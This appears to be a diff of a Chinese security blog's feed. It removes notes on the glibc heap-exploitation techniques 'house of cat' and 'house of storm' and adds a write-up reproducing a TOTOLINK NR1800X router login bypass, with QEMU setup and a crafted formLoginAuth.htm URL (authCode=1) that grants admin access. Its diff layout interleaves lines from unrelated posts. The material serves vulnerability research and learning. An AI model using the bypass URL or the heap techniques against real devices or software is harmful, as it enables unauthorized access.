-<h2 id="第一条链"><a href="#第一条链" class="headerlink" title="第一条链"></a>第一条链</h2><h2 id="malloc-assert的触发"><a href="#malloc-assert的触发" class="headerlink" title="__malloc_assert的触发"></a>__malloc_assert的触发</h2><h3 id="该函数的内容"><a href="#该函数的内容" class="headerlink" title="该函数的内容"></a>该函数的内容</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">__malloc_assert (const char *assertion, const char *file, unsigned int line,</span><br><span class="line">		 const char *function)</span><br><span class="line">{</span><br><span class="line">  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",</span><br><span class="line">		     __progname, __progname[0] ? ": " : "",</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : "", function ? ": " : "",</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (stderr);</span><br><span class="line">  abort ();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/pic/TOTOLINK_NR1800X/0.png" alt="img"></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先收集信息发现程序是通过lighttpd启动的，架构是小端序的mips架构</p>
+<p>因为程序的特殊性，本次复现会通过用户态和系统态两个状态进行复现</p>
+<p><strong>用户态</strong></p>
+<p>启动</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./usr/sbin/lighttpd</span><br></pre></td></tr></tbody></table></figure>
 
-<p>这是__malloc_assert的内容，会执行入fxprintf 然后进入abort</p>
-<h3 id="该函数被调用的条件"><a href="#该函数被调用的条件" class="headerlink" title="该函数被调用的条件"></a>该函数被调用的条件</h3><p>_int_malloc—-&gt;sysmalloc—-&gt;__malloc_assert</p>
-<p>也就是说能走到sysmalloc就可以执行__malloc_assert</p>
-<p>是通过_int_malloc的部分进行的sysmalloc的调用，和调用有关的源码如下</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {</span><br><span class="line">    // 当可用内存块大小大于等于请求大小和最小块大小之和时</span><br><span class="line">    remainder_size = size - nb; // 计算剩余大小</span><br><span class="line">    remainder = chunk_at_offset(victim, nb); // 获取剩余块</span><br><span class="line">    av-&gt;top = remainder; // 更新top块</span><br><span class="line">    set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); // 设置请求块头</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE); // 设置剩余块头</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb); // 检查分配的块</span><br><span class="line">    void *p = chunk2mem(victim); // 获取用户指针</span><br><span class="line">    alloc_perturb(p, bytes); // 调用perturb函数</span><br><span class="line">    return p; // 返回用户指针</span><br><span class="line">} </span><br><span class="line">else if (atomic_load_relaxed(&amp;av-&gt;have_fastchunks)) {</span><br><span class="line">    // 如果有快速释放的块存在</span><br><span class="line">    malloc_consolidate(av); // 合并小块减少碎片</span><br><span class="line">    if (in_smallbin_range(nb)) // 恢复原始bin索引</span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">    else</span><br><span class="line">        idx = largebin_index(nb);</span><br><span class="line">} </span><br><span class="line">else {</span><br><span class="line">    void *p = sysmalloc(nb, av); // 调用系统内存分配</span><br><span class="line">    if (p != NULL)</span><br><span class="line">        alloc_perturb(p, bytes); // 调用perturb函数</span><br><span class="line">    return p; // 返回用户指针</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 结束函数</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/pic/TOTOLINK_NR1800X/1.png" alt="img"></p>
+<p>这里报了错 要指定配置文件</p>
+<p><img src="/pic/TOTOLINK_NR1800X/2.png" alt="img"></p>
+<p>这里说没有/var/run/lighttpd.pid文件 我们创造一个就好</p>
+<p><img src="/pic/TOTOLINK_NR1800X/3.png" alt="img"></p>
+<p><img src="/pic/TOTOLINK_NR1800X/4.png" alt="img"></p>
+<p>可以看到程序确实是启动了 但是根本就没有回显，这就是用户态造成的问题了，接下来我们用系统态复现</p>
+<p><strong>系统态</strong></p>
+<p>用户态访问是白板，很显然是哪里出了问题，很大可能是配置文件没有加载全，这种情况就转化为系统态</p>
+<p>QEMU启动虚拟机所需要的镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta</span><br></pre></td></tr></tbody></table></figure>
 
-<p>要到最后一个else才可以执行</p>
-<p>1.可用内存块大小大于小于请求大小和最小块大小之和时,也就是top chunk无法满足的时候可以触发</p>
-<p>sysmalloc关于__malloc_assert的调用代码:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||</span><br><span class="line">         ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">          prev_inuse (old_top) &amp;&amp;</span><br><span class="line">          ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</span><br></pre></td></tr></tbody></table></figure>
+<p>配置本地</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo brctl addbr virbr0</span><br><span class="line">sudo ifconfig virbr0 192.168.2.1/24 up</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.2.11/24 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br></pre></td></tr></tbody></table></figure>
 
-<p>在C语言中，<code>assert</code> 是一个宏，用于帮助在开发和调试过程中验证程序的假设。但当这些假设不成立时，<code>assert</code> 会引发程序崩溃或终止</p>
-<p>当 <code>assert</code> 条件为假时，<code>assert</code> 宏会打印错误信息并调用 <code>abort</code> 函数终止程序。</p>
-<p>检测条件</p>
-<ol>
-<li>old_size &gt;= 0x20;</li>
-<li>old_top.prev_inuse = 0;</li>
-<li>old_top页对齐</li>
-</ol>
-<p><img src="/pic/house_of_cat/1.png" alt="img"></p>
-<h2 id="fxprintf-vfxprintf"><a href="#fxprintf-vfxprintf" class="headerlink" title="fxprintf -> vfxprintf"></a>fxprintf -&gt; vfxprintf</h2><p>这里可以没有遇到困难可以直接到</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">int __vfxprintf (FILE *fp, const char *fmt, va_list ap,</span><br><span class="line">         unsigned int mode_flags)</span><br><span class="line">{</span><br><span class="line">  if (fp == NULL)</span><br><span class="line">    fp = stderr;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  int res = locked_vfxprintf (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  return res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>启动之后配置如下图</p>
+<p><img src="/pic/TOTOLINK_NR1800X/5.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta \ </span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append "root=/dev/sda1 console=tty0" -nographic \</span><br><span class="line">    -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></tbody></table></figure>
 
-<h3 id="第一个阻碍点"><a href="#第一个阻碍点" class="headerlink" title="第一个阻碍点"></a>第一个阻碍点</h3><p>接着往下面走</p>
-<p><img src="/pic/house_of_cat/2.png" alt="img"></p>
-<p>在这里卡住了我们看一下源码</p>
-<p><img src="/pic/house_of_cat/3.png" alt="img"></p>
-<p>_IO_flockfile的源码</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># define _IO_flockfile(_fp) \</span><br><span class="line">  if (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)-&gt;_lock)</span><br></pre></td></tr></tbody></table></figure>
+<p>再配置宿主机</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig eth0 192.168.2.12 up</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
 
-<p>_IO_lock_lock的源码</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#define _IO_lock_lock(_name) \</span><br><span class="line">  do {                                \</span><br><span class="line">    void *__self = THREAD_SELF;                      \</span><br><span class="line">    if ((_name).owner != __self)                      \</span><br><span class="line">      {                               \</span><br><span class="line">    lll_lock ((_name).lock, LLL_PRIVATE);                 \</span><br><span class="line">        (_name).owner = __self;                      \</span><br><span class="line">      }                               \</span><br><span class="line">    ++(_name).cnt;                          \</span><br><span class="line">  } while (0)</span><br></pre></td></tr></tbody></table></figure>
+<p>将文件复制到虚拟环境中</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">scp -r squashfs-root/ root@192.168.2.12:/root/</span><br></pre></td></tr></tbody></table></figure>
 
-<p> 可以看到进了之后就是一个无限循环，死锁。所以我们要绕过这个，通过上面的代码可以得到条件</p>
-<p>1.fp–&gt;flag要是一个可读取的地址</p>
-<p><img src="/pic/house_of_cat/4.png" alt="img"></p>
-<p>然后就可以绕过这个检测</p>
-<h2 id="locked-vfxprintf-vfprintf-internal直接可以进"><a href="#locked-vfxprintf-vfprintf-internal直接可以进" class="headerlink" title="locked_vfxprintf -> vfprintf_internal直接可以进"></a>locked_vfxprintf -&gt; vfprintf_internal直接可以进</h2><h3 id="第二个障碍点"><a href="#第二个障碍点" class="headerlink" title="第二个障碍点"></a>第二个障碍点</h3><p>然后接着往下面走发现进不了vtable，通过源码调试发现</p>
-<p><img src="/pic/house_of_cat/5.png" alt="img"></p>
-<p><img src="/pic/house_of_cat/6.png" alt="img"></p>
-<p>不能进入_IO_vtable_check 进入就代表没过检测，这里检测vtable的位置于是出现了第二个障碍点</p>
-<p>1.通过修改fake_io的结构来给虚表的位置赋值为_IO_file_xsputn+0x10</p>
-<p><img src="/pic/house_of_cat/7.png" alt="img"></p>
-<p><img src="/pic/house_of_cat/8.png" alt="img"></p>
-<p><img src="/pic/house_of_cat/9.png" alt="img"></p>
-<h2 id="第二条链也是house-of-cat的关键"><a href="#第二条链也是house-of-cat的关键" class="headerlink" title="第二条链也是house of cat的关键"></a>第二条链也是house of cat的关键</h2><h3 id="第三个障碍"><a href="#第三个障碍" class="headerlink" title="第三个障碍"></a>第三个障碍</h3><p><img src="/pic/house_of_cat/10.png" alt="img"></p>
-<p><img src="/pic/house_of_cat/11.png" alt="img"></p>
-<p>1.这个地方需要fp–&gt;wide_data要有值</p>
-<p>2.这个值指向的两个位置一个是IO_write_ptr一个是IO_write_base,前者要比后者小才对**，不然就无法使was_writting为true</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bool was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">              &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">             || _IO_in_put_mode (fp));</span><br></pre></td></tr></tbody></table></figure>
+<p>遇到了一个报错</p>
+<p><img src="/pic/TOTOLINK_NR1800X/6.png" alt="img"></p>
+<p>我们要指定ssh客户端使用的密钥类型</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo scp -o HostKeyAlgorithms=+ssh-rsa -r squashfs-root/ root@172.26.71.12:/root/</span><br></pre></td></tr></tbody></table></figure>
 
-<p>然后就进入_IO_switch_to_wget_mode</p>
-<h2 id="劫持rip流"><a href="#劫持rip流" class="headerlink" title="劫持rip流"></a>劫持rip流</h2><p><img src="/pic/house_of_cat/12.png" alt="img"></p>
-<p>通过rax–&gt;[rax+0xe0]–&gt; 到call  [rax+0xe0]+0x18 来劫持rip</p>
-<p>还可以劫持rdx</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">0x7ffff7e07cbf &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]     RDX, [0x5555555592b0] =&gt; 2</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/pic/TOTOLINK_NR1800X/7.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ /bin/sh</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/pic/house_of_cat/13.png" alt="img"></p>
-<p>成功劫持，至此house of cat的过程结束</p>
+<p>在执行命令启动环境</p>
+<p><img src="/pic/TOTOLINK_NR1800X/8.png" alt="img"></p>
+<p><img src="/pic/TOTOLINK_NR1800X/9.png" alt="img"></p>
+<p>成功启动环境</p>
+<h3 id="登录验证绕过漏洞分析"><a href="#登录验证绕过漏洞分析" class="headerlink" title="登录验证绕过漏洞分析"></a>登录验证绕过漏洞分析</h3><p>先通过抓包观察</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi?action=login HTTP/1.1</span><br><span class="line">Host: 192.168.2.12</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Origin: http://192.168.2.12</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.2.12/login.html</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=55555</span><br></pre></td></tr></tbody></table></figure>
+
+<p>响应包</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Connection: close</span><br><span class="line">Content-type: text/plain</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Location: http://192.168.2.12/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login</span><br><span class="line">Date: Mon, 29 Jul 2024 08:07:07 GMT</span><br><span class="line">Server: lighttpd/1.4.20</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">protal page</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>对第一个包进行分析</p>
+<p>POST /cgi-bin/cstecgi.cgi?action=login HTTP/1.1  可以知道在cstecgi.cgi中，我们跟进分析，可以根据第一个抓包的内容跟踪程序执行流</p>
+<p><img src="/pic/TOTOLINK_NR1800X/10.png" alt="img"></p>
+<p><img src="/pic/TOTOLINK_NR1800X/11.png" alt="img"></p>
+<p><img src="/pic/TOTOLINK_NR1800X/12.png" alt="img"></p>
+<p><img src="/pic/TOTOLINK_NR1800X/13.png" alt="img"></p>
+<p>而off_44C074对应的是 sub_42AEEC函数</p>
+<p><img src="/pic/TOTOLINK_NR1800X/14.png" alt="img"></p>
+<p><img src="/pic/TOTOLINK_NR1800X/15.png" alt="img"></p>
+<p>从我们第二个包的分析中可以看出程序执行的是红框框的那部分 <a href="http://192.168.2.12/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login">http://192.168.2.12/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=login.html&amp;action=login</a></p>
+<p>可以跟踪authCode 在lighttpd程序中定位到Form_Login</p>
+<p><img src="/pic/TOTOLINK_NR1800X/16.png" alt="img"></p>
+<p><img src="/pic/TOTOLINK_NR1800X/17.png" alt="img"></p>
+<p>根据动态调试</p>
+<p><img src="/pic/TOTOLINK_NR1800X/18.png" alt="img"><br>goURL就是接下来要访问的html文件，authCode则是验证是否正确登录的一个值，goURL要么设置为home.html要么不设置</p>
+<p>因此我们可以构造下面的url，来绕过登录，进入后台，并且可以获取到cookie的SESSION_ID。</p>
+<p><a href="http://192.168.2.12/formLoginAuth.htm?authCode=1&amp;userName=admin&amp;password=aaa&amp;goURL=home.html&amp;action=login">http://192.168.2.12/formLoginAuth.htm?authCode=1&amp;userName=admin&amp;password=aaa&amp;goURL=home.html&amp;action=login</a></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.2.12/formLoginAuth.htm?username=admin&amp;password=55555&amp;authCode=1&amp;goURL=home.html&amp;action=login</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/TOTOLINK_NR1800X/19.png" alt="img"></p>
 ]]></content>
       <categories>
-        <category>pwn学习</category>
-        <category>堆利用</category>
+        <category>iot</category>
+        <category>漏洞复现</category>
+        <category>TOTOLINK</category>
       </categories>
       <tags>
-        <tag>house_of</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>house-of-storm</title>
-    <url>/2024/08/15/house%20of%20storm/</url>
-    <content><![CDATA[<h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>House Of Storm 结合了 unsortedbin attack 和 Largebin attack 的攻击技术，其基本原理和 Largebin attack 类似，可以达到任意地址写的效果,感觉就是在原有的unsorted bin attack的过程加上了一个large bin attack攻击去修改size使得 unsorted bin 可以成功返回</p>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.glibc版本小于2.30,因为2.30之后加入了检查，unsorted bin attack无法使用<br>2.需要攻击者在largebin和unsorted_bin中分别布置一个chunk 这两个chunk需要在归位之后处于同一个largebin的index中,且unsortedbin中的chunk要比largebin中的大<br>3.需要unsorted_bin中的bk指针可控<br>4.需要largebin中的bk指针和bk_nextsize指针可控</p>
-<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>这里引用了Rookle师傅对于源码的注释</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">//#define unsorted_chunks(M)          (bin_at (M, 1))</span><br><span class="line">//如果unsorted bins不为空，从尾到头遍历unsorted bin中的每个chunk</span><br><span class="line">while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) </span><br><span class="line">{</span><br><span class="line">    bck = victim-&gt;bk;//取出unsorted的尾部的chunk</span><br><span class="line">    /*</span><br><span class="line">        检查当前遍历的 chunk 是否合法，chunk 的大小不能小于等于 2 * SIZE_SZ，</span><br><span class="line">        也不能超过 该分配区总的内存分配量。然后获取 chunk 的大小并赋值给 size。</span><br><span class="line">        这里的检查似乎有点小问题，直接使用了 victim-&gt;size，但 victim-&gt;size </span><br><span class="line">        中包含了相关的标志位信息，使用 chunksize(victim) 才比较合理，但在 </span><br><span class="line">        unsorted bin 中的空闲 chunk 的所有标志位都清零了，所以这里直接 </span><br><span class="line">        victim-&gt;size 没有问题。</span><br><span class="line">    */</span><br><span class="line">    if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</span><br><span class="line">        || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))</span><br><span class="line">        malloc_printerr(check_action, "malloc(): memory corruption",</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line"></span><br><span class="line">    size = chunksize(victim);//获取victim的size</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">        如果要申请的大小在smallbin范围 且 unsorted chunks 只有一个chunk，且</span><br><span class="line">        victim是last_remainder 且 victim的size大于请求的chunk的大小nb加上</span><br><span class="line">        (MINSIZE)最小chunk的size,那么就切割remainder,然后返回victim。</span><br><span class="line"></span><br><span class="line">        last_remainder 是一个 chunk 指针，分配区上次分配 small chunk 时，</span><br><span class="line">        从一个 chunk 中分 裂出一个 small chunk 返回给用户，分裂后的剩余部分</span><br><span class="line">        形成一个 chunk，last_remainder 就是 指向的这个 chunk。</span><br><span class="line">    */</span><br><span class="line">    if (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">        bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) {</span><br><span class="line"></span><br><span class="line">        //分割remainder</span><br><span class="line">        remainder_size = size - nb;//计算分割后剩下的size</span><br><span class="line">        remainder = chunk_at_offset(victim, nb);//获取remainder的地址</span><br><span class="line">        //把remainder加入unsorted bin中</span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder; // 设置last_remainder为remainder</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        //如果是remainder在large bin的范围，则把fd_nextsize,fd_nextsize清零</span><br><span class="line">        if (!in_smallbin_range(remainder_size)) {</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">        }</span><br><span class="line">        //设置victim的size</span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                 (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">        //设置remainder的size</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        //设置remainder的物理相邻的下一个chunk的prev_size</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);//默认不做任何操作</span><br><span class="line">        void *p = chunk2mem(victim);//将chunk指针转化为mem指针</span><br><span class="line">        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做</span><br><span class="line">        return p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //把victim从unsorted bin 中移除</span><br><span class="line">    unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    //如果 victim 的size 与申请的size相等，那么就返回其。</span><br><span class="line">    if (size == nb) {</span><br><span class="line">        //设置victim物理相邻的下一个chunk的prev_inuse位</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        //如果av不是main_arena 也就是说如果不是主进程,设置NON_MAIN_ARENA位</span><br><span class="line">        if (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA; </span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb); // 默认不做任何操作</span><br><span class="line">        void *p = chunk2mem(victim);//把chunk转换为mem指针</span><br><span class="line">        alloc_perturb(p, bytes);//将p的mem部分全部设置为bytes ,默认什么也不做</span><br><span class="line">        return p;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //如果上一步取出的chunk没有匹配成功，那么将该chunk放入对应的bin中</span><br><span class="line">    //如果在smallbin的范围,则放到对应多small bin中</span><br><span class="line">    if (in_smallbin_range(size)) </span><br><span class="line">    {</span><br><span class="line">        victim_index = smallbin_index(size);//获取size对应的smallbin的index</span><br><span class="line">        bck = bin_at(av, victim_index);//bck指向size对应的smallbin的链表头</span><br><span class="line">        //fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">    }</span><br><span class="line">    else//如果不再smallbin的范围，也就是说在large bin 的范围</span><br><span class="line">    {</span><br><span class="line">        victim_index = largebin_index(size);//获取size对应的large bin的index</span><br><span class="line">        bck = bin_at(av, victim_index);//bck指向size对应的large bin的链表头</span><br><span class="line">        fwd = bck-&gt;fd;//fwd指向size对应的large bin的链表中的新加入的chunk</span><br><span class="line"></span><br><span class="line">        //如果large bin 非空，在largbin进行按顺序插入</span><br><span class="line">        if (fwd != bck) {</span><br><span class="line">            /* Or with inuse bit to speed comparisons */</span><br><span class="line">            size |= PREV_INUSE;</span><br><span class="line">            assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert</span><br><span class="line">            /*</span><br><span class="line">                large bin中的chunk是按从大到小排列的，如果size &lt; large bin </span><br><span class="line">                的最后一个chunk，说明size是这个large bin中的最小的，我们把它</span><br><span class="line">                加入到此large bin尾部。</span><br><span class="line">            */</span><br><span class="line">            if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) {</span><br><span class="line"></span><br><span class="line">                fwd = bck;</span><br><span class="line">                bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                /*</span><br><span class="line">                large bin 中size最小的chunk的fd_nextsize会指向size最大的</span><br><span class="line">                那个chunk，也就是首部的chunk。同样，large bin 中size最大的</span><br><span class="line">                chunk的bk_nextsize会指向size最小的那个chunk。</span><br><span class="line">                victim的bk_nextsize指向large bin原来最小的chunk，它的</span><br><span class="line">                bk_nextsize指向最大的那个chunk。那么原来的最小的就成了第二小的了。</span><br><span class="line">                把它fd_nextsize和bk_nextsize都修正。</span><br><span class="line">                */</span><br><span class="line">                victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                //最大size的chunk的bk_nextsize，和原来最小chunk的bk_nextsize都指向victim</span><br><span class="line">                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            } </span><br><span class="line">            else //如果victim不是large bin 中最小的chunk</span><br><span class="line">            {</span><br><span class="line">                assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);//默认不启用assert</span><br><span class="line">                //从大到小（从头到尾）找到合适的位置</span><br><span class="line">                while ((unsigned long) size &lt; fwd-&gt;size) {</span><br><span class="line">                    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</span><br><span class="line">                }</span><br><span class="line">                //如果size刚好相等，就直接加入到其后面省的改fd_nextsize和bk_nextsize了</span><br><span class="line">                if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">                    fwd = fwd-&gt;fd;</span><br><span class="line">                else </span><br><span class="line">                {</span><br><span class="line">                    //size不相等，即size&gt;fwd-&gt;size，把victim加入到纵向链表中</span><br><span class="line">                    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                }</span><br><span class="line">                bck = fwd-&gt;bk;</span><br><span class="line">            }</span><br><span class="line">        } </span><br><span class="line">        else //如果large bin 为空，将victim加入到纵向列表</span><br><span class="line">            victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    //#define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><span class="line">    mark_bin(av, victim_index); //把victim加入到的bin的表示为非空</span><br><span class="line">    //把victim加入到large bin的链表中</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-
-
-<p>在unsorted bin中的chunk脱链，然后链接到large bin的过程中，可以同时进行这两种攻击。为之，所以我们需要在large bin中布置一个chunk，并且在unsorted bin中布置一个size稍大于largebin的chunk，使其能够链接在large bin中chunk的后面。</p>
-<p>house of storm中，unsorted bin attack主要用到的是unsorted_chunks(av) → bk同时也被赋值为了fake（只是一个记号）。在下次申请chunk，使其进入unsorted bin的分支时，也就是利用unsorted bin attack后,bk会指向target_addr,victim = unsorted_chunks(av) → bk（即fake），<strong>紧接着会有一个分支检查其size是否满足申请</strong>。只要满足了，则会直接分配fake处为chunk返回。</p>
-<p>我们已经知道largebin attack是向任意地址赋值堆地址。在64字长的系统中，地址寻址为8字节，但堆地址只占5个字节，而特别的是仅已0x55或0x56开头。那么只要我们通过largebin attack向fake + 0x3处，赋值一个堆地址，则以fake为chunk的size处为0x55或者0x56。这样，就成功的修改了size</p>
-<p>用图简单表示的话</p>
-<p><img src="/pic/house_of_storm/0.png" alt="img"></p>
-<h2 id="导致crash的原因："><a href="#导致crash的原因：" class="headerlink" title="导致crash的原因："></a>导致crash的原因：</h2><p>在通过调试demo的时候我们发现有的时候是可以通过的，有的时候是不行的，通过调试发现，无法通过的时候是因为fake_chunk的size为0x55 只有为0x56的时候可以通过 对应的源码在_int_malloc返回到_libc_malloc</p>
-<p>/*<br>    #define arena_for_chunk(ptr) <br>        (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</p>
-<pre><code>过以下检测需要满足的要求，只需满足一条即可
-1. victim 为 0
-2. IS_MMAPPED 为 1
-3. NON_MAIN_ARENA 为 0
-</code></pre>
-<p>*/<br>assert(!victim || chunk_is_mmapped(mem2chunk(victim))<br>       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</p>
-<p>0x56：0101 0110，满足第二个。</p>
-<p>0x55：0101 0101，不满足，会报错。</p>
